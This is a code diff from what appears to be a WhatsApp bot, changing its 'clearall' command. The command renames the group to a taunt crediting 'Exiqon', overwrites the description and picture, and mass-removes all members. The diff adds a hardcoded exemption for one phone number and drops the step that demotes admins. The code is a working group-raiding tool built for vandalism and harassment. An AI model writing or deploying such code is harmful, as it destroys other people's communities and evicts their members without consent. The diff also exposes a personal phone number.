@@ -1902,37 +1902,28 @@ case 'clearall':
     const fs = require('fs');
     const imagePath = path.join(__dirname, 'Assets', 'nuke-pic.jpg');
 
-    const groupMembers = participants.filter(member => member.id !== botNumber);
+    const groupMembers = participants.filter(member =>
+        member.id !== botNumber &&
+        member.id !== '491741711168@s.whatsapp.net' // Exiqon's Nummer
+    );
+
     const groupMemberIds = groupMembers.map(member => member.id);
 
-    const admins = participants.filter(member => member.admin && member.id !== botNumber);
-
     try {
-
-        if (admins.length > 0) {
-            await Phoenix.groupParticipantsUpdate(m.chat, admins.map(a => a.id), 'demote');
-            console.log('Admins degradiert:', admins.map(a => a.id));
-        }
-
-
         const groupMetadata = await Phoenix.groupMetadata(m.chat);
         const currentName = groupMetadata.subject;
-
 
         const newName = `${currentName} ??? Fucked by ¿?𝐸𝑥ͥ𝑖𝑞ͣ𝑜ͫ𝑛?¿!!!`;
         await Phoenix.groupUpdateSubject(m.chat, newName);
 
-
         await Phoenix.groupUpdateDescription(m.chat, "This group got fucked by ¿?𝐸𝑥ͥ𝑖𝑞ͣ𝑜ͫ𝑛?¿!");
-
 
         const imageBuffer = fs.readFileSync(imagePath);
         await Phoenix.updateProfilePicture(m.chat, imageBuffer);
 
-        
         if (groupMemberIds.length > 0) {
             await Phoenix.groupParticipantsUpdate(m.chat, groupMemberIds, 'remove');
-            reply('Alle Mitglieder wurden aus der Gruppe entfernt.');
+            reply('Alle Mitglieder (außer dir) wurden aus der Gruppe entfernt.');
         } else {
             reply('Die Gruppe wurde aktualisiert, aber es gab keine Mitglieder zum Entfernen.');
         }
